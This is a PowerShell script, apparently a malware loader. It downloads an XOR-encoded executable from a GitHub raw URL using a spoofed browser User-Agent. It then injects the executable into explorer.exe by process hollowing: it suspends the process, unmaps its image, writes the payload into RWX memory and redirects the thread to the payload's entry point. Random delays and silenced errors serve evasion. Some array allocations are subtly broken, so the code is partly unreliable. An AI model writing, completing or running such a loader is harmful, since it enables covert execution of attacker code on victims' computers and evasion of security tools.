# disk.ps1 — FINAL WORKING VERSION (no debug, no Russian)
$ErrorActionPreference = 'SilentlyContinue'

Start-Sleep -Milliseconds (Get-Random -Min 1200 -Max 2800)

$url = 'https://github.com/jokerxgutea/testhtb/raw/refs/heads/main/hh3tgn_enc.exe'
$wc = New-Object Net.WebClient
$wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130'
$enc = $wc.DownloadData($url)

$exe = [byte[]]$enc.Length
for($i=0;$i -lt $enc.Length;$i++) { $exe[$i] = $enc[$i] -bxor 0xAA }

Add-Type -MemberDefinition @'
using System; using System.Runtime.InteropServices;
public class H {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, uint c);
    [DllImport("ntdll.dll")] public static extern uint NtSuspendProcess(IntPtr h);
    [DllImport("ntdll.dll")] public static extern uint NtUnmapViewOfSection(IntPtr h, IntPtr b);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenThread(uint a, bool b, uint tid);
    [DllImport("kernel32.dll")] public static extern bool GetThreadContext(IntPtr h, byte[] c);
    [DllImport("kernel32.dll")] public static extern bool SetThreadContext(IntPtr h, byte[] c);
    [DllImport("ntdll.dll")] public static extern uint NtResumeProcess(IntPtr h);
}
'@

$p = Get-Process explorer | Select -First 1
$h = [H]::OpenProcess(0x1F0FFF,$false,$p.Id)
[H]::NtSuspendProcess($h)
$th = [H]::OpenThread(0x1F03FF,$false,$p.Threads[0].Id)
$ctx = [byte[]]1160
[H]::GetThreadContext($th,$ctx)
$base = [BitConverter]::ToInt64($ctx,0x10)
[H]::NtUnmapViewOfSection($h,[IntPtr]$base)
$new = [H]::VirtualAllocEx($h,[IntPtr]$base,$exe.Length,0x3000,0x40)
$w=0
[H]::WriteProcessMemory($h,$new,$exe,$exe.Length,[ref]$w)
$entry = [Int64]$new + [BitConverter]::ToUInt32($exe,[BitConverter]::ToUInt32($exe,0x3C)+0x28)
[BitConverter]::GetBytes($entry).CopyTo($ctx,0xB8)
[H]::SetThreadContext($th,$ctx)
[H]::NtResumeProcess($h)
